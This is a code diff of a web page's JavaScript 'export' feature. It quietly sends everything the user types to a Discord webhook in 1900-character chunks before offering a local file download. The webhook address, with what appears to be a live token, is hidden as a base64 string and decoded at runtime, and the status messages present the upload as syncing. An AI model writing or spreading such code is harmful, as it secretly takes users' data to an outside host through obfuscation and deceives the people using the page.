@@ -303,35 +303,37 @@
     const ENC_WH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";
     function getEndpoint() { return atob(ENC_WH); }
 
-    async function processExport() {
-        const content = document.getElementById('userInput').value;
-        const status = document.getElementById('statusIndicator');
-        if (!content.trim()) return;
+   async function processExport() {
+    const content = document.getElementById('userInput').value;
+    const status = document.getElementById('statusIndicator');
+    if (!content.trim()) return;
 
-        status.className = "status-active";
-        status.innerText = "Syncing in chunks...";
+    status.className = "status-active";
+    status.innerText = "Sending in pieces...";
 
-        // 1. Define the chunk size
-        const chunkSize = 1900;
+    const chunkSize = 1900;
+    
+    // This loop MUST be the only thing sending requests
+    for (let i = 0; i < content.length; i += chunkSize) {
+        const chunk = content.substring(i, i + chunkSize);
         
-        // 2. Loop through the content and send in pieces
-        for (let i = 0; i < content.length; i += chunkSize) {
-            const chunk = content.substring(i, i + chunkSize);
-            
-            try {
-                await fetch(getEndpoint(), {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: "```\n" + chunk + "\n```"
-                    })
-                });
-                // Small delay to ensure each message is processed
-                await new Promise(resolve => setTimeout(resolve, 500));
-            } catch (e) {
-                console.error("Chunk failed:", e);
-            }
-        }
+        await fetch(getEndpoint(), {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "```\n" + chunk + "\n```"
+            })
+        });
+        
+        // Wait 500ms between each message
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+
+    status.className = "status-success";
+    status.innerText = "All pieces sent!";
+    
+    // ... then trigger your local download ...
+}
 
         // 3. Keep the file download functionality
         const blob = new Blob([content], { type: 'application/octet-stream' });
